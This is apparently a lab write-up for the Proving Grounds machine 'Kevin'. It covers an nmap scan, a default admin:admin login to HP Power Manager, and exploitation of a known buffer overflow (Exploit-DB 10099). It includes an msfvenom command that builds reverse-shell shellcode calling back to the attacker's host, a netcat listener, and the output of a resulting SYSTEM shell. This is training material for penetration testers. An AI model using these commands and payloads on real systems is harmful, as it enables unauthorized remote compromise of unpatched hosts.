---
layout: post
title: PG | Kevin
subtitle: Effective enumeration will save you time.
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 07:09 UTC
Nmap scan report for 192.168.191.45
Host is up (0.015s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.191.45/index.asp
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  �\�\�U      Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2023-10-28T07:11:02+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2023-10-28T07:10:47+00:00
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2023-08-01T03:26:36
|_Not valid after:  2024-01-31T03:26:36
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49158/tcp open  msrpc       Microsoft Windows RPC
49160/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-28T00:10:47-07:00
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ba:5f:74 (VMware)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-28T07:10:47
|_  start_date: 2023-10-28T07:08:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.39 seconds
~~~

# Service Enumeration

## HTTP (TCP/80)

The target is hosting HP Power Manager website on port 80.

![Kevin](/assets/img/KevinPG(1).png)

I started by searching for the default credentials and found admin:admin which worked!

After enumerating through the website I found nothing of significance, so started searching for know exploits

I found [this](https://www.exploit-db.com/exploits/10099) exploit "Hewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow" (10099.py) which uses a python script to execute a Buffer Overflow attack

![Kevin](/assets/img/KevinPG(2).png)

Inspecting the python script we can see it executes shell code in the SHELL variable, this is where we will have to generate our shell code for our reverse shell and replace for our foothold

![Kevin](/assets/img/KevinPG(3).png)

~~~shell
┌──(kali㉿kali)-[~/Desktop/Kevin]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.167 LPORT=80 -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a' -e x86/alpha_mixed -f c

-b: specifies the bad characters, which as seen in the image of the payload are displayed just before the shell
-e x86/alpha_mixed: generates alphanumeric shellcode for a 32bit architecture
~~~

Replace Shell code in the n00b n00b shell with our MSFVenom generated shell code

![Kevin](/assets/img/KevinPG(4).png)

Start netcat listener on port 80
~~~shell
┌──(kali㉿kali)-[~/Desktop/Kevin]
└─$ nc -nvlp 80  
listening on [any] 80 ...
~~~
Run the exploit
~~~shell
┌──(kali㉿kali)-[~/Desktop/Kevin]
└─$ python2.7 10099.py 192.168.191.45                                             
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending evil buffer...
HTTP/1.0 200 OK

[+] Done!
~~~
And we recieve a root (system) shell on our netcat listener!
~~~shell
┌──(kali㉿kali)-[~/Desktop/Kevin]
└─$ nc -nvlp 80  
listening on [any] 80 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.191.45] 49168
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
~~~